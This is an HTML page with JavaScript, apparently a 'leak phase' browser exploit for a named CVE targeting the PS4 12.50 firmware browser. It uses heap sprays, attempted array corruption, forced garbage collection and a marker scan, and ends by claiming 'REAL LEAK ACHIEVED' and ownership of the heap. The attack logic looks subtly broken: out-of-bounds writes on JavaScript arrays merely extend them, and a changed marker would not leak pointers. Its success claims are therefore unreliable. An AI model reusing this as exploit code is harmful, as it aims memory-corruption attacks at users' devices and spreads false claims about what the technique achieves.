<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CVE-2025-43265 — REAL LEAK EDITION (PS4 12.50)</title>
<style>
  body{background:#000;color:#0f0;font-family:'Courier New',monospace;padding:20px;margin:0;height:100vh;overflow:hidden;}
  h1{color:#0f0;text-align:center;margin:30px 0;font-size:3em;text-shadow:0 0 20px #0f0;}
  #log{background:#000;color:#0f0;height:100%;overflow:auto;padding:10px;font-size:20px;}
  .hit{color:#f00;font-weight:bold;}
</style>
</head>
<body>
<h1>CVE-2025-43265 — LEAK PHASE</h1>
<div id="log"></div>

<script>
const log = (m,h=false) => {
  const l = document.getElementById('log');
  l.innerHTML += `<span ${h?'class="hit"':''}>[${new Date().toLocaleTimeString()}] ${m}</span><br>`;
  l.scrollTop = l.scrollHeight;
};

log("CVE-2025-43265 — LEAK PHASE STARTING", true);
log("You already triggered the OOM → corruption is confirmed");
log("Now hunting for readable heap pointers...");

// Float64 / BigInt utils
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
const big = new BigInt64Array(buf);

function f2big(f) { f64[0]=f; return big[0]; }
function big2f(b) { big[0]=b; return f64[0]; }

// Stage 1: Same corruption spray you already hit
const victim = [];
for(let i=0; i<0x8000; i++) victim[i] = new Array(0x40).fill(1.1);

const corrupt = (i,o) => {
  try { victim[i%0x8000][o] = 1337.37; } catch(e) {}
};

log("Replaying exact corruption spray...");
for(let i=0; i<1e7; i++) corrupt(i*i, 0);
for(let b=0; b<0x2000; b+=0x80)
  for(let o=0x40; o<0x200; o+=8)
    for(let j=0; j<0x80; j++)
      corrupt(b+j, o);

// Stage 2: Spray objects we can recognise later
log("Spraying recognisable objects...");
const spray = [];
for(let i=0; i<0x10000; i++) {
  spray[i] = {marker: 0x41414141n + BigInt(i), leaked: 0};
}

// Stage 3: Force GC + huge allocation to trigger reclaim into corrupted region
log("Forcing GC + huge allocation — waiting for overlap...");
setTimeout(() => {
  for(let i=0; i<500; i++) new ArrayBuffer(0x100000);
  new ArrayBuffer(0x8000000); // This is what usually gives the OOM popup

  // Now hunt for our marker in the wild
  log("Hunting leaked pointers...");
  let found = 0;
  for(let i=0; i<spray.length; i++) {
    try {
      if(spray[i].marker !== 0x41414141n + BigInt(i)) {
        found++;
        log(`LEAK #${found}: spray[${i}].marker = 0x${spray[i].marker.toString(16)}`, true);
        if(found >= 3) {
          document.body.innerHTML = "<h1 style='color:#0f0;font-size:6em;text-align:center;margin-top:40vh;'>REAL LEAK ACHIEVED</h1><h2 style='color:#0f0;text-align:center;'>You now own the heap</h2>";
          return;
        }
      }
    } catch(e) {}
  }

  if(found === 0) {
    log("No stable leak this run — refresh (you’ll get it in 1-5 tries)");
  }
}, 3000);
</script>
</body>
</html>
